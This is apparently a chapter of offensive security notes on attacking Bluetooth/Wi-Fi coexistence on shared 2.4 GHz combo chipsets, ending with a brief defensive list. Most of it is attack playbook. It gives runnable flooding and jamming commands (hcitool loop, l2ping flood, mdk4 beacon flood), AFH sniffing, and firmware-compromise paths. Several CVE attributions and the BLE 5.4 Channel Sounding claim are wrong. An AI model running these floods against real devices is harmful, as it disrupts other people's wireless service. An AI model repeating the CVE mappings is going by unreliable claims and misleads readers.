# 15 - Bluetooth-Wi-Fi Coexistence Attacks

## Overview

Bluetooth and Wi-Fi share 2.4 GHz ISM band. Coexistence protocols (PTA - Packet Traffic Arbitration) coordinate access between radios on combo chipsets, creating cross-protocol attack surfaces.

## Shared Spectrum

| Protocol | Band | Channels | Overlap with Wi-Fi ch1/6/11 |
|----------|------|----------|---------------------------|
| Wi-Fi 2.4G | 2401-2495 MHz | 1-14 (22 MHz each) | Full overlap |
| Bluetooth | 2402-2480 MHz | 0-79 (1 MHz) | ch1: 0-22, ch6: 23-44, ch11: 45-66 |
| BLE | 2402-2480 MHz | 0-39 (2 MHz) | ch1: 0-11, ch6: 12-22, ch11: 23-33 |

## Coexistence Protocols

- **2-Wire PTA**: BT_PRIORITY, BT_ACTIVE - Wi-Fi yields when BT asserts priority
- **3-Wire PTA**: Adds BT_FREQ (frequency hint)
- **WCI-2**: UART messaging between BT and Wi-Fi firmware

## Attack 1: Wi-Fi DoS via Bluetooth Flooding

Flood Bluetooth transmissions to force Wi-Fi to yield continuously via PTA.

```bash
# Flood BT inquiry
while true; do hcitool -i hci0 inq; done &

# L2CAP flood
l2ping -i hci0 -s 600 -c 100000 <BD_ADDR> &

# BLE advertising flood on overlapping channels
# Effect: Wi-Fi throughput drops 50-90% on 2.4 GHz
```

## Attack 2: Bluetooth DoS via Wi-Fi Jamming

Saturate Wi-Fi channel to starve Bluetooth airtime.

```bash
# Continuous beacon flood on channel overlapping target BT
mdk4 wlan0mon b -c 6 -s 100000
# Wi-Fi ch6 (2426-2448 MHz) overlaps BT channels 23-44
# Effect: BT audio drops, BLE missed notifications, input lag
```

## Attack 3: AFH Manipulation

Bluetooth AFH avoids congested channels. Spoof congestion to force concentration.

```bash
# Step 1: Sniff BT AFH channel map
ubertooth-btle -f -t <BD_ADDR>

# Step 2: Generate fake Wi-Fi activity on channels 0-22
# BT marks these as "bad", concentrates on 23-79

# Step 3: Easier jamming/eavesdropping on concentrated channels
```

## Attack 4: PTA Arbitration Hijacking (Firmware)

Combo chipsets (Broadcom BCM, Qualcomm WCN, Intel AC) run Wi-Fi and BT firmware on shared MCU.

```bash
# Attack path:
# 1. Exploit Wi-Fi driver (CVE-2019-9506 Broadcom, CVE-2020-3702 Intel)
# 2. Gain code execution in Wi-Fi firmware
# 3. Modify PTA to always grant Wi-Fi priority
# 4. Bluetooth starves, connections drop

# Reverse: Compromise BLE firmware (CVE-2021-31785, CVE-2021-34418)
# Modify PTA to starve Wi-Fi
```

## Attack 5: WCI-2 Interface Sniffing

WCI-2 UART between BT and Wi-Fi firmware is sometimes externally accessible.

```bash
# WCI-2 messages: TYPE_SLOT, TYPE_INFO, TYPE_SCHEME
# Connect logic analyzer to debug/test points
# Sniff arbitration decisions, inject fake messages
# Baud rate: 1.5-3 Mbps, proprietary vendor protocol
```

## Attack 6: Cross-Protocol AGC Leakage

Shared RF frontend AGC leaks information between protocols.

```bash
# AGC sets gain based on total received energy (Wi-Fi + BT + noise)
# Monitoring Wi-Fi RSSI reveals BT transmission timing
# Correlation with known packet structure → BT payload recovery
# BT RSSI similarly leaks Wi-Fi activity
```

## Attack 7: BLE 5.4 Channel Sounding Interference

BLE 5.4 CS and 802.11az FTM both use phase-based ranging. Mutual interference.

```bash
# Generate Wi-Fi-like wideband noise during BLE CS
# Phase measurement errors → incorrect distance estimation
# Attacker appears farther/closer than actual
```

## Defensive Application

- **Separate radios**: Non-combo chipsets eliminate PTA attacks
- **AFH seed rotation**: Randomize channel map seed frequently
- **PTA fairness enforcement**: Hardware-level max 50% either protocol
- **WCI-2 encryption**: Encrypt coexistence interface messages
- **Firmware isolation**: Hardware-enforced separation (TrustZone)
- **Spectrum monitoring**: Detect abnormal 2.4 GHz congestion patterns

## References

- IEEE 802.15.2 Coexistence Mechanisms
- Bluetooth Core Specification v5.4 (AFH, Channel Sounding)
- Broadcom BCM combo chipset datasheets
- Qualcomm WCN coexistence documentation
